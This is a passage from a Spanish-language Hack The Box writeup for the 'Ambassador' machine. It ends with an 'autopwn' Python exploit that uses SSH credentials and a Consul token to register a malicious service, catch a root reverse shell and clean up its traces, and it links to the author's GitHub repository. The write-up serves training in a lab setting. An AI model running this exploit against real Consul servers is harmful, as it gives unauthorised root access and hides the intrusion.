			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">json_obj</span><span class="p">)</span>

			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'File created : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">json_file</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">upload_files</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_client</span><span class="p">):</span>
		<span class="k">with</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">open_sftp</span><span class="p">()</span> <span class="k">as</span> <span class="n">sftp_client</span><span class="p">:</span>
			<span class="n">sftp_client</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">shell_file</span><span class="p">,</span> <span class="s">'/tmp/.{}/{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">shell_file</span><span class="p">))</span>
			<span class="n">sftp_client</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">json_file</span><span class="p">,</span> <span class="s">'/tmp/.{}/{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">json_file</span><span class="p">))</span>

			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Uploaded files'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">ssh_client</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'ssh'</span><span class="p">][</span><span class="s">'user'</span><span class="p">],</span>
											 <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'ssh'</span><span class="p">][</span><span class="s">'pass'</span><span class="p">])</span>

			<span class="c1"># create workstation
</span>			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="s">'mkdir -p /tmp/.{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">))</span>

			<span class="c1"># get token and upload required files
</span>			<span class="bp">self</span><span class="p">.</span><span class="n">get_consul_token</span><span class="p">(</span><span class="n">ssh_client</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">upload_files</span><span class="p">(</span><span class="n">ssh_client</span><span class="p">)</span>
			
			<span class="c1"># create service and send root shell
</span>			<span class="n">command</span> <span class="o">=</span> <span class="s">"curl -X PUT 'http://localhost:8500/v1/agent/service/register?replace-existing-checks=true'"</span> \
				<span class="o">+</span> <span class="sa">f</span><span class="s">" -H 'X-Consul-Token: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'consul'</span><span class="p">][</span><span class="s">'token'</span><span class="p">]</span><span class="si">}</span><span class="s">'"</span> \
				<span class="o">+</span> <span class="sa">f</span><span class="s">" --data @/tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">json_file</span><span class="si">}</span><span class="s">"</span>

			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

			<span class="c1"># listen mode to receive shell
</span>			<span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>

			<span class="k">if</span> <span class="n">shell</span><span class="p">.</span><span class="n">sock</span><span class="p">:</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Press Ctrl + D to exit.'</span><span class="p">)</span>
				<span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Removing service'</span><span class="p">)</span>
			<span class="c1"># remove service
</span>			<span class="n">command</span> <span class="o">=</span> <span class="s">"curl -X PUT 'http://localhost:8500/v1/agent/service/deregister/autopwn_shell'"</span> \
				<span class="o">+</span> <span class="sa">f</span><span class="s">" -H 'X-Consul-Token: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">target_credentials</span><span class="p">[</span><span class="s">'consul'</span><span class="p">][</span><span class="s">'token'</span><span class="p">]</span><span class="si">}</span><span class="s">'"</span>
			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Removing workstation with uploaded files'</span><span class="p">)</span>
			<span class="c1"># remove workstation
</span>			<span class="n">ssh_client</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm -r /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

			<span class="c1"># close ssh connection
</span>			<span class="n">ssh_client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

<span class="c1">## Main flow
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">ascii_title</span> <span class="o">=</span> <span class="s">'''
	 /\  ._ _  |_   _.  _  _  _.  _|  _  ._    /\      _|_  _  ._       ._  
	/--\ | | | |_) (_| _&gt; _&gt; (_| (_| (_) |    /--\ |_|  |_ (_) |_) \/\/ | | 
	                                                           |           
	                                                                  by marss
	'''</span>

	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
		<span class="n">description</span><span class="o">=</span><span class="n">ascii_title</span><span class="p">,</span>
		<span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
		<span class="n">epilog</span><span class="o">=</span><span class="s">'''</span><span class="se">\n</span><span class="s">Example:
		autopwn.py -i 10.10.10.10 -p 4444
		'''</span><span class="p">)</span>

	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Specified IP to receive the shell'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Specified PORT to receive the shell'</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="k">print</span><span class="p">(</span><span class="n">ascii_title</span><span class="p">)</span>

	<span class="n">exploit</span> <span class="o">=</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
	<span class="n">exploit</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><blockquote><p>Poc Autopwn</p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/autopwn.png" alt="PoC Autopwn" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Assambador">https://github.com/E1P0TR0</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/cve-2021-43798/" class="post-tag no-text-decoration" >cve-2021-43798</a> <a href="/tags/directory-path-traversal/" class="post-tag no-text-decoration" >Directory Path Traversal</a> <a href="/tags/leakage-information/" class="post-tag no-text-decoration" >Leakage Information</a> <a href="/tags/git/" class="post-tag no-text-decoration" >Git</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >MySQL</a> <a href="/tags/sqlite/" class="post-tag no-text-decoration" >SQLite</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Ambassador - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBAmbassador/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Ambassador - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBAmbassador/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBAmbassador/&amp;text=Hackthebox Writeup Ambassador - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div><div class="card"> <a href="/posts/HTBUpdown/"><div class="card-body"> <em class="timeago small" data-ts="1666557676" > 2022-10-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Updown</h3><div class="text-muted small"><p> Overwiew Access to development page by information leak in git repository Remote execution of commands by access to the upload of .phar files Remote execution of commands by the obsolete ve...</p></div></div></a></div><div class="card"> <a href="/posts/HTBMeta/"><div class="card-body"> <em class="timeago small" data-ts="1644619727" > 2022-02-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Meta</h3><div class="text-muted small"><p> En la fase de enumeración encontramos que en el servicio web se aplica Virtual Hosting y buscando subdominios encontramos una página para extraer Metadatos usando la herramienta exiftool. Encontram...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBMetaTwo/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Metatwo</p></a> <a href="/posts/NahamCon_2022/" class="btn btn-outline-primary" prompt="Newer"><p>NahamCon CTF 2022</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
